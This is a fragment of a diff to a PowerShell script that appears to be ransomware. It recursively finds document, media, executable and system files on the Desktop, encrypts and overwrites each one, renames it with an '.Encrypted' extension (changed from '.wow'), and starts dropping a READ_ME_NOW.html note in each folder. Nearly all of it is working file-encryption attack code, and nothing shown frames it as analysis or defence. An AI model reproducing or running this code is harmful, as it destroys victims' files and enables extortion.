@@ -29,12 +29,12 @@ $DesktopPath = [Environment]::GetFolderPath("Desktop")
 
 gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*rar","*.exe","*.jpeg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.dll","*.sys","*.ppt","*.pptx","*.csv" | %{
 
-   try{
+  try{
        $file = Get-Content $_ -raw;
        $encrypt = Encrypt-File $file $key
        Set-Content -Path $_ -Value $encrypt
 
-        $newname=$_.Name+'.wow';
+        $newname=$_.Name+'.Encrypted';
         ren -Path $_.FullName -NewName $newname -Force;
 
         $path=$_.DirectoryName+'\READ_ME_NOW.html';
